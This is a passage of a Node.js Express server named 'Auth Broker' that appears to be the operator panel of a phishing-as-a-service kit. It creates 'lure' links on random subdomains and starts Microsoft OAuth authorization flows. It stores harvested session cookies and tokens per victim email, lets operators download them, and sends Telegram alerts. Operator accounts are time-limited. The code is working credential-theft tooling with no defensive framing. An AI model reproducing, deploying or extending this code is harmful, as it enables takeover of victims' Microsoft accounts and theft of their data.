    res.status(500).json({ error: err.message || 'Failed to generate cookies' });
  }
});

// ===== OVERVIEW =====
app.get('/api/overview', requireLogin, (req, res) => {
  try {
    const files = fs.readdirSync(COOKIES_DIR).filter(Boolean);
    const cookieFiles = files.filter(n => n.startsWith('cookiesfile_') && n.endsWith('.json'));
    const tokenFiles = files.filter(n => n.startsWith('tokenfile_') && n.endsWith('.json'));

    function readMeta(file) {
      try {
        const full = path.join(COOKIES_DIR, file);
        const data = readJsonMaybeEncrypted(full);
        return data;
      } catch (e) {
        return null;
      }
    }

    const cookieMeta = cookieFiles.map(f => ({ file: f, meta: readMeta(f) })).filter(x => x.meta);
    const tokenMeta = tokenFiles.map(f => ({ file: f, meta: readMeta(f) })).filter(x => x.meta);

    const emailsSet = new Set();
    const cookieFileNames = [];
    const tokenFileNames = [];

    for (const c of cookieMeta) {
      const meta = c.meta || {};
      const email = meta.email || meta.user_email || c.file.replace(/^cookiesfile_/, '').replace(/\.json$/, '').replace(/_at_/g, '@').replace(/_/g, '.');
      const created_by = meta.created_by || email || 'unknown';

      if (req.session.user && req.session.user.role !== 'admin') {
        if (created_by !== req.session.user.username && email !== req.session.user.username) continue;
      }

      emailsSet.add(email);
      cookieFileNames.push(c.file);
    }

    for (const t of tokenMeta) {
      const meta = t.meta || {};
      const email = meta.email || meta.user_email || t.file.replace(/^tokenfile_/, '').replace(/\.json$/, '').replace(/_at_/g, '@').replace(/_/g, '.');
      const created_by = meta.created_by || email || 'unknown';

      if (req.session.user && req.session.user.role !== 'admin') {
        if (created_by !== req.session.user.username && email !== req.session.user.username) continue;
      }

      emailsSet.add(email);
      tokenFileNames.push(t.file);
    }

    const emails = Array.from(emailsSet);

    res.json({
      stats: {
        uniqueEmails: emails.length,
        cookieFiles: cookieFileNames.length,
        tokenFiles: tokenFileNames.length
      },
      emails,
      cookieFiles: cookieFileNames,
      tokenFiles: tokenFileNames
    });
  } catch (err) {
    res.status(500).json({ error: err.message || 'failed to load overview' });
  }
});

// ===== DOMAINS =====
app.get('/api/domains', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/domains', method: 'GET', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  const p = domainsFilePath();
  let domains = [];

  if (fs.existsSync(p)) {
    domains = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
  }

  if (req.session.user && req.session.user.role !== 'admin') {
    domains = domains.filter(d => d.created_by === req.session.user.username);
  }

  res.json({ domains });
});

app.post('/api/domains', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/domains', method: 'POST', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  try {
    const { domain, cloudflare } = req.body || {};
    if (!domain) return res.status(400).json({ error: 'domain required' });
    if (!isValidDomain(domain)) return res.status(400).json({ error: 'invalid domain' });

    const p = domainsFilePath();
    let domains = [];
    if (fs.existsSync(p)) {
      domains = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
    }

    if (domains.find(d => d.domain === domain)) {
      return res.json({ success: true, existing: true });
    }

    const record = {
      domain,
      verified: true,
      created_at: new Date().toISOString(),
      created_by: req.session.user.username,
      cloudflare_zone_id: cloudflare?.zone_id || null
    };

    domains.unshift(record);
    fs.writeFileSync(p, JSON.stringify(domains, null, 2), 'utf8');

    notifyTelegram('✅ Domain Added', `Domain: ${domain}\n👤 User: ${req.session.user.username}`, req.session.user.username).catch(()=>{});
    logAudit({ action: 'domain_added', user: req.session.user.username, domain, ip: req.ip });

    res.json({ success: true, domain, verified: true });
  } catch (err) {
    res.status(500).json({ error: err.message || 'failed to add domain' });
  }
});

app.delete('/api/domains/:domain', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: `/api/domains/${req.params.domain}`, method: 'DELETE', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  const domain = req.params.domain;
  const p = domainsFilePath();
  let domains = [];

  if (fs.existsSync(p)) {
    domains = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
  }

  const domainRecord = domains.find(d => d.domain === domain);
  if (!domainRecord) return res.status(404).json({ error: 'domain not found' });

  if (req.session.user.role !== 'admin' && domainRecord.created_by !== req.session.user.username) {
    return res.status(403).json({ error: 'forbidden' });
  }

  domains = domains.filter(d => d.domain !== domain);
  fs.writeFileSync(p, JSON.stringify(domains, null, 2), 'utf8');

  logAudit({ action: 'domain_deleted', user: req.session.user.username, domain, ip: req.ip });
  res.json({ success: true });
});

// ===== LINKS =====
app.get('/api/links', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/links', method: 'GET', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  const p = linksFilePath();
  let links = [];

  if (fs.existsSync(p)) {
    links = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
  }

  if (req.session.user && req.session.user.role !== 'admin') {
    links = links.filter(l => l.created_by === req.session.user.username);
  }

  res.json({ links });
});

app.post('/api/links', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/links', method: 'POST', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  try {
    const { domain, title, description, doc_type, landing_url } = req.body || {};

    if (!domain) return res.status(400).json({ error: 'domain required' });
    if (!doc_type) return res.status(400).json({ error: 'doc_type required' });

    const domainsPath = domainsFilePath();
    let domains = [];
    if (fs.existsSync(domainsPath)) {
      domains = JSON.parse(fs.readFileSync(domainsPath, 'utf8') || '[]');
    }

    const domainRecord = domains.find(d => d.domain === domain);
    if (!domainRecord) return res.status(404).json({ error: 'domain not found' });
    if (!domainRecord.verified) return res.status(400).json({ error: 'domain not verified' });

    if (req.session.user.role !== 'admin' && domainRecord.created_by !== req.session.user.username) {
      return res.status(403).json({ error: 'forbidden: domain not owned' });
    }

    const subdomain = generateWorkerStyleId();

    const linksPath = linksFilePath();
    let links = [];
    if (fs.existsSync(linksPath)) {
      links = JSON.parse(fs.readFileSync(linksPath, 'utf8') || '[]');
    }

    const linkId = generateRandomId(16);
    const linkRecord = {
      id: linkId,
      domain,
      subdomain,
      title: title || 'Untitled',
      description: description || '',
      doc_type,
      landing_url: landing_url || null,
      client_id: CLIENT_ID,
      tenant: TENANT,
      scope: SCOPE,
      created_at: new Date().toISOString(),
      created_by: req.session.user.username,
      expires_at: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
      visits: 0,
      visitors: []
    };

    links.unshift(linkRecord);
    fs.writeFileSync(linksPath, JSON.stringify(links, null, 2), 'utf8');

    logAudit({ action: 'link_created', user: req.session.user.username, linkId, domain, ip: req.ip });

    res.json({
      success: true,
      link: linkRecord,
      subdomain,
      url: `https://${subdomain}.${domain}`,
      worker_url: `${APP_BASE_URL}/api/worker/lure/${linkId}`
    });
  } catch (err) {
    console.error('Link creation error:', err);
    res.status(500).json({ error: err.message || 'Failed to create link' });
  }
});

app.delete('/api/links/:id', requireLogin, (req, res) => {
  if (req.session.user && isUserExpired(req.session.user.username)) {
    logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: `/api/links/${req.params.id}`, method: 'DELETE', ip: req.ip });
    return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
  }

  const id = req.params.id;
  const p = linksFilePath();
  let links = [];

  if (fs.existsSync(p)) {
    links = JSON.parse(fs.readFileSync(p, 'utf8') || '[]');
  }

  const link = links.find(l => l.id === id);
  if (!link) return res.status(404).json({ error: 'link not found' });

  if (req.session.user.role !== 'admin' && link.created_by !== req.session.user.username) {
    return res.status(403).json({ error: 'forbidden' });
  }

  const remaining = links.filter(l => l.id !== id);
  fs.writeFileSync(p, JSON.stringify(remaining, null, 2), 'utf8');

  logAudit({ action: 'link_deleted', user: req.session.user.username, linkId: id, ip: req.ip });

  res.json({ success: true });
});

// ===== SETTINGS =====
app.get('/api/settings', requireLogin, (req, res) => {
  try {
    const users = fs.existsSync(usersFilePath()) ? JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]') : [];
    const currentUser = users.find(u => u.username === req.session.user.username) || {};

    if (req.session.user.role === 'admin') {
      let settings = {};
      if (fs.existsSync(settingsFilePath())) {
        try { settings = readJsonMaybeEncrypted(settingsFilePath()); } catch (e) { settings = {}; }
      }
      return res.json({
        ...settings,
        user_telegram_chat_id: currentUser.telegram_chat_id || '',
        user_telegram_bot_token: currentUser.telegram_bot_token || ''
      });
    }

    return res.json({
      telegram_chat_id: currentUser.telegram_chat_id || '',
      telegram_bot_token: currentUser.telegram_bot_token || ''
    });
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
});

app.post('/api/settings', requireLogin, requireAdmin, (req, res) => {
  try {
    const { telegram_bot_token, telegram_chat_id, per_user_telegram } = req.body || {};

    let settings = {};
    if (fs.existsSync(settingsFilePath())) {
      try { settings = readJsonMaybeEncrypted(settingsFilePath()) || {}; } catch (e) { settings = {}; }
    }

    settings.telegram_bot_token = telegram_bot_token || settings.telegram_bot_token;
    settings.telegram_chat_id = telegram_chat_id || settings.telegram_chat_id;
    if (per_user_telegram && typeof per_user_telegram === 'object') settings.per_user_telegram = { ...(settings.per_user_telegram || {}), ...per_user_telegram };
    writeJsonMaybeEncrypted(settingsFilePath(), settings);

    logAudit({ action: 'settings_updated', admin: req.session.user.username, fields: Object.keys(req.body), ip: req.ip });

    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message || 'save failed' });
  }
});

// ===== ADMIN USERS =====
app.get('/api/admin/users', requireLogin, requireAdmin, (req, res) => {
  let users = [];
  if (fs.existsSync(usersFilePath())) {
    users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
  }
  users = users.map(u => ({
    username: u.username,
    role: u.role,
    email: u.email,
    telegram_chat_id: u.telegram_chat_id || null,
    created_at: u.created_at,
    expires_at: u.expires_at,
    status: u.expires_at && new Date(u.expires_at) < new Date() ? 'expired' : 'active'
  }));
  res.json({ users });
});

app.post('/api/admin/users', requireLogin, requireAdmin, async (req, res) => {
  try {
    const { username, password, role, email, expires_at, telegram_chat_id } = req.body || {};

    if (!username || !password) {
      return res.status(400).json({ error: 'username & password required' });
    }

    let users = [];
    if (fs.existsSync(usersFilePath())) {
      users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
    }

    if (users.find(u => u.username === username)) {
      return res.status(409).json({ error: 'user exists' });
    }

    const hash = bcrypt.hashSync(password, 10);

    const newUser = {
      username,
      passwordHash: hash,
      role: role || 'user',
      email: email || `${username}@broker.local`,
      telegram_chat_id: telegram_chat_id || null,
      created_at: new Date().toISOString(),
      expires_at: expires_at || null
    };

    users.push(newUser);
    fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');

    await notifyTelegram(
      '👤 New User Created',
      `Username: ${username}\n📧 Email: ${newUser.email}\n⏱️ Expires: ${expires_at || 'Never'}`,
      req.session.user.email
    );

    logAudit({ action: 'admin_create_user', admin: req.session.user.username, username, ip: req.ip });

    res.json({ success: true, user: newUser });

  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/admin/users/:username', requireLogin, requireAdmin, (req, res) => {
  try {
    const target = req.params.username;
    let users = [];
    if (fs.existsSync(usersFilePath())) {
      users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
    }
    const idx = users.findIndex(u => u.username === target);
    if (idx === -1) return res.status(404).json({ error: 'user not found' });
    users.splice(idx, 1);
    fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');

    logAudit({ action: 'admin_delete_user', admin: req.session.user.username, username: target, ip: req.ip });

    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.put('/api/admin/users/:username', requireLogin, requireAdmin, (req, res) => {
  const { expires_at } = req.body || {};
  const username = req.params.username;

  let users = [];
  if (fs.existsSync(usersFilePath())) {
    users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
  }

  const user = users.find(u => u.username === username);
  if (!user) return res.status(404).json({ error: 'user not found' });

  user.expires_at = expires_at || null;
  user.updated_at = new Date().toISOString();

  fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');

  logAudit({ action: 'admin_update_user_expiry', admin: req.session.user.username, username, expires_at, ip: req.ip });

  res.json({ success: true, user });
});

// ===== OAUTH FLOW =====
app.post('/api/auth/start', (req, res) => {
  try {
    if (!CLIENT_ID) return res.status(400).json({ error: 'CLIENT_ID not configured' });

    const state = generateRandomId(32);
    const tenant = TENANT;
    const redirectUri = `${APP_BASE_URL}/api/auth/callback`;

    saveOAuthState(state, {
      redirect_uri: redirectUri,
      created_at: new Date().toISOString()
    });

    const params = new URLSearchParams({
      client_id: CLIENT_ID,
      response_type: 'code',
      redirect_uri: redirectUri,
      response_mode: 'query',
      scope: SCOPE,
      state: state,
      prompt: 'select_account'
    });

    const authUrl = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/authorize?${params.toString()}`;

    res.json({ success: true, auth_url: authUrl });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Download cookies
app.get('/api/download/cookies/:email', requireLogin, (req, res) => {
  const email = req.params.email;
  if (!(req.session.user && (req.session.user.role === 'admin' || req.session.user.username === email))) {
    return res.status(403).json({ error: 'forbidden' });
  }

  const p = cookieFilePath(email);
  if (!fs.existsSync(p)) return res.status(404).json({ error: 'cookie file not found' });

  const raw = fs.readFileSync(p, 'utf8');
  if (raw.startsWith('ENCRYPTED\n')) {
    if (!AUTH_DATA_PASSPHRASE) return res.status(403).json({ error: 'encrypted' });
    const plain = decryptBase64(raw.slice('ENCRYPTED\n'.length), AUTH_DATA_PASSPHRASE);
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', `attachment; filename="cookies_${sanitizeFilenamePart(email)}.json"`);
    logAudit({ action: 'download_cookies', user: req.session.user.username, email, ip: req.ip });
    return res.send(plain);
  } else {
    logAudit({ action: 'download_cookies', user: req.session.user.username, email, ip: req.ip });
    return res.download(p, `cookies_${sanitizeFilenamePart(email)}.json`);
  }
});

// Download tokens (admin only)
app.get('/api/download/tokens/:email', requireLogin, requireAdmin, (req, res) => {
  const email = req.params.email;
  const p = tokenFilePath(email);

  if (!fs.existsSync(p)) return res.status(404).json({ error: 'token file not found' });

  try {
    const audit = { admin: req.session.user.username, action: 'download_tokens', email, ip: req.ip };
    logAudit(audit);
  } catch (e) {}

  const raw = fs.readFileSync(p, 'utf8');
  if (raw.startsWith('ENCRYPTED\n')) {
    if (!AUTH_DATA_PASSPHRASE) return res.status(403).json({ error: 'encrypted' });
    const plain = decryptBase64(raw.slice('ENCRYPTED\n'.length), AUTH_DATA_PASSPHRASE);
    return res.setHeader('Content-Type', 'application/json') || res.send(plain);
  } else {
    return res.download(p, `tokens_${sanitizeFilenamePart(email)}.json`);
  }
});

// Delete files (admin)
app.delete('/api/files/:email', requireLogin, requireAdmin, (req, res) => {
  const email = req.params.email;
  const cookieP = cookieFilePath(email);
  const tokenP = tokenFilePath(email);
  const userVaultP = userTokensFilePath(email);
  const removed = [];

  if (fs.existsSync(cookieP)) { fs.unlinkSync(cookieP); removed.push(path.basename(cookieP)); }
  if (fs.existsSync(tokenP)) { fs.unlinkSync(tokenP); removed.push(path.basename(tokenP)); }
  if (fs.existsSync(userVaultP)) { fs.unlinkSync(userVaultP); removed.push(path.basename(userVaultP)); }

  logAudit({ action: 'delete_files', admin: req.session.user.username, email, removed, ip: req.ip });
  res.json({ removed });
});

// Start server
app.listen(PORT, () => {
  console.log(`Auth Broker server listening on ${PORT}`);
  console.log(`APP_BASE_URL=${APP_BASE_URL}`);
  console.log(`✓ Tokens expire in: ${BROKER_TOKEN_EXPIRY} (1 year default)`);
  if (CLOUDFLARE_TURNSTILE_SECRET) {
    console.log(`✓ Cloudflare Turnstile enabled`);
  }
});
